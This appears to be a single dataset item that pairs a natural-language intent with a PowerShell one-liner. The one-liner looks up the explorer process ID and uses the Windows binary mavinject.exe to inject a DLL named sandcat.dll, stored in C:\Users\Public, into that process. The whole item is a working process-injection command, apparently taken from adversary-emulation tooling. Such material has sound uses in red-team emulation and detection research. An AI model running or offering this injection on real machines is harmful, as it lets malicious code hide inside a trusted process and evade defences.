# Natural language intent:
# Get the explorer process, retrieve its ID, and inject a DLL into it using PowerShell.

$explorer = Get-Process -Name explorer; ; mavinject.exe $explorer.id C:\Users\Public\sandcat.dll
